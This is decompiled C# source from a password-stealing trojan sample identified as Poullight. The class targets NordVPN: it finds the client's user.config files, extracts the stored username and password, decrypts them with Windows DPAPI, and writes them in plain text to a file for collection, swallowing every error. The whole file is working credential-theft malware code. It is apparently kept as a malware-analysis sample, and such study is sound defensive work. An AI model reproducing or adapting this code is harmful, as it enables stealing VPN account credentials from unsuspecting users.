// Decompiled with JetBrains decompiler
// Type: NordVPN
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

internal class NordVPN
{
  public static void Start()
  {
    try
    {
      string str1 = "";
      string path = string.Format("{0}NordVPN", (object) Buffer.path_l);
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Buffer.path_lad, nameof (NordVPN)));
      if (directoryInfo.Exists)
      {
        foreach (DirectoryInfo directory1 in directoryInfo.GetDirectories("NordVpn.exe*"))
        {
          foreach (FileSystemInfo directory2 in directory1.GetDirectories())
          {
            string str2 = Path.Combine(directory2.FullName, "user.config");
            if (File.Exists(str2))
            {
              XmlDocument xmlDocument = new XmlDocument();
              xmlDocument.Load(str2);
              string innerText1 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
              string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
              string str3 = !string.IsNullOrEmpty(innerText1) ? NordVPN.Decrypt(innerText1) : (string) null;
              string str4 = !string.IsNullOrEmpty(innerText2) ? NordVPN.Decrypt(innerText2) : (string) null;
              if (!string.IsNullOrEmpty(str3) && !string.IsNullOrEmpty(str4))
                str1 = str1 + "=====================================\n" + "Login: " + str3 + "\n" + "Password: " + str4 + "\n" + "=====================================\n\n\n";
            }
          }
        }
        if (string.IsNullOrEmpty(str1.Trim()))
          return;
        File.WriteAllText("{path}\\NordVPN.txt", str1.Trim().Replace("\n", Environment.NewLine));
      }
      else
        File.WriteAllText(string.Format("{0}\\info.txt", (object) path), string.Format("{0}NordVPN не найден на компьютере.", (object) Buffer.head));
    }
    catch
    {
    }
  }

  protected static string Decrypt(string str)
  {
    try
    {
      return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(str), (byte[]) null, DataProtectionScope.LocalMachine));
    }
    catch
    {
      return (string) null;
    }
  }
}
